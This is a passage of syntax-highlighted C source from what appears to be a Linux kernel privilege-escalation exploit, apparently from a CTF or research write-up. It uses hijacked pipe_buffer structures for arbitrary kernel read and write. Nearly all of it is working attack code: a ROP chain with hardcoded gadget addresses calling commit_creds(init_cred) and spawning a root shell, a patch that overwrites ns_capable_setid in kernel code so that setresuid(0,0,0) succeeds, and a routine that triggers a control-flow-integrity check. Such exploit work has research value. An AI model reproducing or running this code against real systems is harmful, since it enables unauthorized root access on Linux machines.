<span class=kt>void</span><span class=w> </span><span class=nf>pgd_vaddr_resolve</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Reading current task_struct...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* read current task_struct */</span>
<span class=w>    </span><span class=n>current_task_page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>current_task</span><span class=p>);</span>
<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>current_task_page</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>current_task_page</span><span class=o>+</span><span class=mh>0x40</span><span class=p>),</span><span class=w> </span><span class=o>&amp;</span><span class=n>buf</span><span class=p>[</span><span class=mi>512</span><span class=p>]);</span>

<span class=w>    </span><span class=n>tsk_buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>buf</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>current_task</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xfff</span><span class=p>));</span>
<span class=w>    </span><span class=n>stack_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
<span class=w>    </span><span class=n>mm_struct_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tsk_buf</span><span class=p>[</span><span class=mi>292</span><span class=p>];</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;[*] kernel stack&#39;s addr: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>stack_addr</span><span class=p>);</span>
<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;[*] mm_struct&#39;s addr: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>mm_struct_addr</span><span class=p>);</span>

<span class=w>    </span><span class=n>mm_struct_page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>mm_struct_addr</span><span class=p>);</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;[*] mm_struct&#39;s page:&quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>mm_struct_page</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* read mm_struct */</span>
<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>mm_struct_page</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
<span class=w>    </span><span class=n>arbitrary_read_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>mm_struct_page</span><span class=o>+</span><span class=mh>0x40</span><span class=p>),</span><span class=w> </span><span class=o>&amp;</span><span class=n>buf</span><span class=p>[</span><span class=mi>512</span><span class=p>]);</span>

<span class=w>    </span><span class=n>mm_struct_buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>buf</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>mm_struct_addr</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xfff</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* only this is a virtual addr, others in page table are all physical addr*/</span>
<span class=w>    </span><span class=n>pgd_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>mm_struct_buf</span><span class=p>[</span><span class=mi>9</span><span class=p>];</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span>
<span class=w>        </span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Got kernel page table of current task: &quot;</span><span class=p>)</span><span class=s>&quot;0x%lx</span><span class=se>\n\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>        </span><span class=n>pgd_addr</span>
<span class=w>    </span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * It may also be okay to write ROP chain on pipe_write&#39;s stack, if there&#39;s</span>
<span class=cm> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span>
<span class=cm> * But what I want is a more novel and general exploitation that </span>
<span class=cm> * doesn&#39;t need any information about the kernel image. </span>
<span class=cm> * So just simply overwrite the task_struct is good :)</span>
<span class=cm> * </span>
<span class=cm> * If you still want a normal ROP, refer to following codes.</span>
<span class=cm>*/</span>

<span class=cp>#define COMMIT_CREDS 0xffffffff811284e0</span>
<span class=cp>#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span>
<span class=cp>#define INIT_CRED 0xffffffff83079ee8</span>
<span class=cp>#define POP_RDI_RET 0xffffffff810157a9</span>
<span class=cp>#define RET 0xffffffff810157aa</span>

<span class=kt>void</span><span class=w> </span><span class=nf>privilege_escalation_by_rop</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>rop</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>],</span><span class=w> </span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span>

<span class=nl>redo</span><span class=p>:</span>

<span class=w>    </span><span class=cm>/* resolving some vaddr */</span>
<span class=w>    </span><span class=n>pgd_vaddr_resolve</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/* reading the page table directly to get physical addr of kernel stack*/</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Reading page table...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * we&#39;d like to write ROP chain directly onto the last page of kernel stack,</span>
<span class=cm>     * and the stack is in fact a VMALLOC area, which means that it might not be</span>
<span class=cm>     * physically continuous, therefore we calculate the last page directly</span>
<span class=cm>    **/</span>
<span class=w>    </span><span class=n>stack_addr_another</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vaddr_resolve</span><span class=p>(</span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=n>stack_addr</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>PAGE_SIZE</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>3</span><span class=p>);</span>
<span class=w>    </span><span class=n>stack_addr_another</span><span class=w> </span><span class=o>&amp;=</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>PAGE_ATTR_NX</span><span class=p>);</span><span class=w> </span><span class=cm>/* N/X bit */</span>
<span class=w>    </span><span class=n>stack_addr_another</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>;</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span>
<span class=w>        </span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Got another virt addr of kernel stack: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>        </span><span class=n>stack_addr_another</span>
<span class=w>    </span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* construct the ROP */</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=p>((</span><span class=mh>0x1000</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mh>0x100</span><span class=p>)</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=mi>8</span><span class=p>);</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>RET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>POP_RDI_RET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>INIT_CRED</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>COMMIT_CREDS</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</span><span class=w> </span><span class=o>+</span><span class=mi>54</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>get_root_shell</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>user_cs</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>user_rflags</span><span class=p>;</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>user_sp</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xFUL</span><span class=p>);</span><span class=w>  </span><span class=cm>/* stack balance */</span>
<span class=w>    </span><span class=n>rop</span><span class=p>[</span><span class=n>idx</span><span class=o>++</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>user_ss</span><span class=p>;</span>

<span class=w>    </span><span class=n>stack_page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=n>stack_addr_another</span><span class=p>);</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Hijacking current task&#39;s stack...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
<span class=w>    </span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>

<span class=w>    </span><span class=n>arbitrary_write_by_pipe</span><span class=p>((</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>stack_page</span><span class=p>,</span><span class=w> </span><span class=n>rop</span><span class=p>,</span><span class=w> </span><span class=mh>0xff0</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* if we get there, it means that our work failed, just retry... */</span>
<span class=w>    </span><span class=k>goto</span><span class=w> </span><span class=n>redo</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>void</span><span class=w> </span><span class=nf>privilege_escalation_by_usma</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cp>#define NS_CAPABLE_SETID 0xffffffff810fd2a0</span>

<span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>kcode_map</span><span class=p>,</span><span class=w> </span><span class=o>*</span><span class=n>kcode_func</span><span class=p>;</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>dst_paddr</span><span class=p>,</span><span class=w> </span><span class=n>dst_vaddr</span><span class=p>,</span><span class=w> </span><span class=o>*</span><span class=n>rop</span><span class=p>,</span><span class=w> </span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>

<span class=w>    </span><span class=cm>/* resolving some vaddr */</span>
<span class=w>    </span><span class=n>pgd_vaddr_resolve</span><span class=p>();</span>

<span class=w>    </span><span class=n>kcode_map</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>mmap</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=mh>0x114514000</span><span class=p>,</span><span class=w> </span><span class=mh>0x2000</span><span class=p>,</span><span class=w> </span><span class=n>PROT_READ</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>PROT_WRITE</span><span class=p>,</span><span class=w> </span>
<span class=w>                     </span><span class=n>MAP_ANONYMOUS</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>MAP_PRIVATE</span><span class=p>,</span><span class=w> </span><span class=mi>-1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>kcode_map</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to create mmap area!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* because of lazy allocation, we need to write it manually */</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>8</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>kcode_map</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
<span class=w>        </span><span class=n>kcode_map</span><span class=p>[</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x1000</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;arttnba3&quot;</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* overwrite kernel code seg to exec shellcode directly :) */</span>
<span class=w>    </span><span class=n>dst_vaddr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>NS_CAPABLE_SETID</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>;</span>
<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;[*] vaddr of ns_capable_setid is: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>dst_vaddr</span><span class=p>);</span>

<span class=w>    </span><span class=n>dst_paddr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vaddr_resolve_for_3_level</span><span class=p>(</span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=n>dst_vaddr</span><span class=p>);</span>
<span class=w>    </span><span class=n>dst_paddr</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mh>0x1000</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>PTE_ENTRY</span><span class=p>(</span><span class=n>dst_vaddr</span><span class=p>);</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span>
<span class=w>        </span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Got ns_capable_setid&#39;s phys addr: &quot;</span><span class=p>)</span><span class=s>&quot;0x%lx</span><span class=se>\n\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>        </span><span class=n>dst_paddr</span>
<span class=w>    </span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* remapping to our mmap area */</span>
<span class=w>    </span><span class=n>vaddr_remapping</span><span class=p>(</span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=mh>0x114514000</span><span class=p>,</span><span class=w> </span><span class=n>dst_paddr</span><span class=p>);</span>
<span class=w>    </span><span class=n>vaddr_remapping</span><span class=p>(</span><span class=n>pgd_addr</span><span class=p>,</span><span class=w> </span><span class=mh>0x114514000</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x1000</span><span class=p>,</span><span class=w> </span><span class=n>dst_paddr</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x1000</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* overwrite kernel code segment directly */</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Start overwriting kernel code segment...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * The setresuid() check for user&#39;s permission by ns_capable_setid(),</span>
<span class=cm>     * so we can just patch it to let it always return true :)</span>
<span class=cm>     */</span>
<span class=w>    </span><span class=n>memset</span><span class=p>(</span><span class=n>kcode_map</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>NS_CAPABLE_SETID</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xfff</span><span class=p>),</span><span class=w> </span><span class=sc>&#39;\x90&#39;</span><span class=p>,</span><span class=w> </span><span class=mh>0x40</span><span class=p>);</span><span class=w> </span><span class=cm>/* nop */</span>
<span class=w>    </span><span class=n>memcpy</span><span class=p>(</span><span class=n>kcode_map</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>NS_CAPABLE_SETID</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xfff</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x40</span><span class=p>,</span><span class=w> </span>
<span class=w>            </span><span class=s>&quot;</span><span class=se>\xf3\x0f\x1e\xfa</span><span class=s>&quot;</span><span class=w>  </span><span class=cm>/* endbr64 */</span>
<span class=w>            </span><span class=s>&quot;H</span><span class=se>\xc7\xc0\x01\x00\x00\x00</span><span class=s>&quot;</span><span class=w>  </span><span class=cm>/* mov rax, 1 */</span>
<span class=w>            </span><span class=s>&quot;</span><span class=se>\xc3</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=cm>/* ret */</span>
<span class=w>            </span><span class=mi>12</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* get root now :) */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] trigger evil ns_capable_setid() in setresuid()...</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>

<span class=w>    </span><span class=n>setresuid</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>
<span class=w>    </span><span class=n>get_root_shell</span><span class=p>();</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * Just for testing CFI&#39;s availability :)</span>
<span class=cm>*/</span>
<span class=kt>void</span><span class=w> </span><span class=nf>trigger_control_flow_integrity_detection</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=o>*</span><span class=n>pbuf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>((</span><span class=kt>size_t</span><span class=p>)</span><span class=n>buf</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>);</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buf_operations</span><span class=w> </span><span class=o>*</span><span class=n>ops</span><span class=p>,</span><span class=w> </span><span class=o>*</span><span class=n>ops_addr</span><span class=p>;</span>

<span class=w>    </span><span class=n>ops_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buf_operations</span><span class=o>*</span><span class=p>)</span><span class=w> </span>
<span class=w>                 </span><span class=p>(((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>vmemmap_base</span><span class=p>)</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=mh>0x40</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mh>0x1000</span><span class=p>);</span>
<span class=w>    </span><span class=n>ops_addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buf_operations</span><span class=o>*</span><span class=p>)((</span><span class=kt>size_t</span><span class=p>)</span><span class=n>ops_addr</span><span class=o>+</span><span class=n>page_offset_base</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* two random gadget :) */</span>
<span class=w>    </span><span class=n>ops</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buf_operations</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=n>buf</span><span class=p>;</span>
<span class=w>    </span><span class=n>ops</span><span class=o>-&gt;</span><span class=n>confirm</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)(</span><span class=mh>0xffffffff81a78568</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>);</span>
<span class=w>    </span><span class=n>ops</span><span class=o>-&gt;</span><span class=n>release</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)(</span><span class=mh>0xffffffff816196e6</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>);</span>

<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>10</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>pbuf</span><span class=o>-&gt;</span><span class=n>ops</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ops_addr</span><span class=p>;</span>
<span class=w>        </span><span class=n>pbuf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=o>*</span><span class=p>)((</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>pbuf</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>

<span class=w>    </span><span class=cm>/* hijack the 4th pipe pointing to 2nd pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_3rd_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=o>&amp;</span><span class=n>evil_4th_buf</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_4th_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=o>&amp;</span><span class=n>evil_2nd_buf</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_2nd_buf</span><span class=p>));</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span>
<span class=w>          </span><span class=n>temp_zero_buf</span><span class=p>,</span><span class=w> </span>
<span class=w>          </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_2nd_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* hijack the 3rd pipe to point to 4th pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=o>&amp;</span><span class=n>evil_3rd_buf</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_3rd_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* write data into dst page */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_2nd_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=mh>0xf00</span><span class=p>);</span><span class=w> </span>

<span class=w>    </span><span class=cm>/* trigger CFI... */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[=] triggering CFI&#39;s detection...</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_2nd_pipe_pid</span><span class=p>][</span><span class=mi>0</span><span class=p>]);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_2nd_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>]);</span>
